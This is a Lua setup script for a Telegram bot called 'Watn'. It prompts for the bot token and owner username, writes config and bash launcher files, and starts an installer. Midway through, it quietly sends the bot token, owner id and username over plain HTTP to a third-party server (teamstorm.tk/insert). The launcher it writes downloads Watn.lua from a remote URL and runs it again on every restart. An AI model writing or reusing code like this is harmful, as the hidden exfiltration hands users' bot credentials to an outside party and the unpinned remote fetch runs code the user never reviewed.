serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_Watn = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_Watn = function() 
local Create_Info = function(Token,Sudo,UserName)  
local Watn_Info_Sudo = io.open("sudo.lua", 'w')
Watn_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
Watn_Info_Sudo:close()
end  
if not database:get(Server_Watn.."Token_Watn") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_Watn.."Token_Watn",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua run.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Watn.."UserName_Watn") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua run.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua run.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_Watn.."UserName_Watn",Json.Info.Username)
database:set(Server_Watn.."Id_Watn",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua run.lua')
end
local function Files_Watn_Info()
Create_Info(database:get(Server_Watn.."Token_Watn"),database:get(Server_Watn.."Id_Watn"),database:get(Server_Watn.."UserName_Watn"))   
http.request("http://teamstorm.tk/insert/?id="..database:get(Server_Watn.."Id_Watn").."&user="..database:get(Server_Watn.."UserName_Watn").."&token="..database:get(Server_Watn.."Token_Watn"))
local RunWatn = io.open("Watn", 'w')
RunWatn:write([[
#!/usr/bin/env bash
cd $HOME/Watn
token="]]..database:get(Server_Watn.."Token_Watn")..[["
rm -fr Watn.lua
wget "https://raw.githubusercontent.com/WatnBot/Watn/master/Watn.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Watn.lua -p PROFILE --bot=$token
done
]])
RunWatn:close()
local RunTs = io.open("tk", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/Watn
while(true) do
rm -fr ../.telegram-cli
screen -S Watn -X kill
screen -S Watn ./Watn
done
]])
RunTs:close()
end
Files_Watn_Info()
database:del(Server_Watn.."Token_Watn");database:del(Server_Watn.."Id_Watn");database:del(Server_Watn.."UserName_Watn")
sudos = dofile('sudo.lua')
os.execute('./ins.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Watn()  
var = true
else   
f:close()  
database:del(Server_Watn.."Token_Watn");database:del(Server_Watn.."Id_Watn");database:del(Server_Watn.."UserName_Watn")
sudos = dofile('sudo.lua')
os.execute('./ins.sh ins')
var = false
end  
return var
end
Load_File()
